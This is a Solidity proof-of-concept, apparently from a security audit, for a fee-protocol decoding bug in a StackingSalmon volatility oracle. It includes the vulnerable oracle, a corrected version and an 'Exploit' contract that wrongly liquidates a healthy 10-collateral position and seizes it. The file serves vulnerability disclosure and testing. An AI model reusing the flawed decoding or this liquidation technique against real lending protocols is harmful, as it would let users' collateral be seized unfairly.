// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  StackingSalmon VolatilityOracle — Shieldify
    Kodiak packs feeProtocol as a uint32 of two 16-bit basis-point fields.
    defaultFeeProtocol = 229379500 is 3500 bps, 3500 bps (35% and 35%).
    _getPoolMetadata still uses Uniswap V3's 4-bit denominator split.

    Pool fee 3000. Fair LP gamma is 1950 on both sides. The bug stores
    gamma0 = 2750 and gamma1 = 3000. Implied vol becomes 3348 instead of
    2757. A 10-collateral position with 15,000 debt is healthy at the fair
    price of 20,000 and is liquidated at the buggy price of 16,469.53.
*/

contract Coll {
    string public symbol = "COLL";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Debt {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VolatilityOracle {
    uint24 public constant FEE = 3000;
    uint32 public constant FEE_PROTOCOL = 229379500;
    uint256 public constant FEE_GROWTH = 1950 * 1e6;

    uint24 public gamma0;
    uint24 public gamma1;
    uint256 public iv;
    uint256 public fairGamma;
    uint256 public ivFair;

    function _getPoolMetadata() public {
        uint24 fee = FEE;
        uint32 feeProtocol = FEE_PROTOCOL;
        uint24 g0 = fee;
        uint24 g1 = fee;
        unchecked {
            // @> VULN: feeProtocol is 3500 bps in each 16-bit half, but this divides by a 4-bit Uniswap denominator
            if (feeProtocol % 16 != 0) g0 -= uint24(fee / (feeProtocol % 16));
            if (feeProtocol >> 4 != 0) g1 -= uint24(fee / (feeProtocol >> 4));
        }
        gamma0 = g0;
        gamma1 = g1;
        fairGamma = uint256(fee) * (10_000 - 3_500) / 10_000;
        iv = _iv(g0, g1);
        ivFair = _iv(uint24(uint256(fairGamma)), uint24(uint256(fairGamma)));
    }

    function _iv(uint24 g0, uint24 g1) internal pure returns (uint256) {
        uint256 revenue0 = FEE_GROWTH * uint256(g1) / 1e6;
        uint256 revenue1 = FEE_GROWTH * uint256(g0) / 1e6;
        return _isqrt(revenue0 + revenue1);
    }

    function _isqrt(uint256 x) internal pure returns (uint256 y) {
        if (x == 0) return 0;
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
}

contract Borrower {
    Coll public immutable coll;
    Debt public immutable debt;
    VolatilityOracle public immutable oracle;
    address public borrower;
    address public lender;
    uint256 public constant COLLATERAL = 10 ether;
    uint256 public constant SPOT = 2000 ether;
    uint256 public constant DEBT_OWED = 15_000 ether;
    uint256 public valueUsed;
    uint256 public valueFair;
    bool public liquidated;

    constructor(Coll _coll, Debt _debt, VolatilityOracle _oracle) {
        coll = _coll;
        debt = _debt;
        oracle = _oracle;
    }

    function open(address _borrower, address _lender) external {
        borrower = _borrower;
        lender = _lender;
        coll.mint(address(this), COLLATERAL);
    }

    function getPrices() public view returns (uint256 buggyValue, uint256 fairValue) {
        fairValue = COLLATERAL * SPOT / 1 ether;
        buggyValue = fairValue * oracle.ivFair() / oracle.iv();
    }

    function liquidate(address liquidator) external {
        oracle._getPoolMetadata();
        (uint256 buggyValue, uint256 fairValue) = getPrices();
        valueUsed = buggyValue;
        valueFair = fairValue;
        uint256 threshold = DEBT_OWED * 10_000 / 8_000;
        require(buggyValue < threshold, "healthy on buggy price");
        require(fairValue > threshold, "fair price would not liquidate");
        liquidated = true;
        coll.transfer(liquidator, COLLATERAL);
    }
}

contract VolatilityOracleFixed {
    uint24 public constant FEE = 3000;
    uint32 public constant FEE_PROTOCOL = 229379500;
    uint24 public gamma0;
    uint24 public gamma1;

    function _getPoolMetadata() public {
        uint24 fee = FEE;
        uint32 feeProtocol = FEE_PROTOCOL;
        uint16 fee0 = uint16(feeProtocol);
        uint16 fee1 = uint16(feeProtocol >> 16);
        gamma0 = fee - uint24(uint256(fee) * fee0 / 10_000);
        gamma1 = fee - uint24(uint256(fee) * fee1 / 10_000);
    }
}

contract Exploit {
    Coll public coll;
    Debt public debt;
    VolatilityOracle public oracle;
    Borrower public book;
    address public lender;

    constructor() {
        coll = new Coll();
        debt = new Debt();
        oracle = new VolatilityOracle();
        book = new Borrower(coll, debt, oracle);
        lender = address(uint160(uint256(keccak256("lender"))));
    }

    function run() external {
        book.open(address(0xB0B), lender);
        debt.mint(address(this), book.DEBT_OWED());
        book.liquidate(address(this));
        debt.transfer(lender, book.DEBT_OWED());
        require(oracle.gamma0() == 2750, "gamma0");
        require(oracle.gamma1() == 3000, "gamma1");
        require(oracle.fairGamma() == 1950, "fair gamma");
        require(oracle.iv() == 3348, "iv");
        require(oracle.ivFair() == 2757, "iv fair");
        require(book.valueFair() == 20_000 ether, "fair value");
        uint256 buggyValue = (uint256(20_000 ether) * 2757) / 3348;
        require(book.valueUsed() == buggyValue, "buggy value");
        require(book.liquidated(), "liquidated");
        require(coll.balanceOf(address(this)) == 10 ether, "seized");
        require(coll.balanceOf(address(book)) == 0, "borrower wiped");
        require(debt.balanceOf(lender) == 15_000 ether, "lender repaid");
    }
}
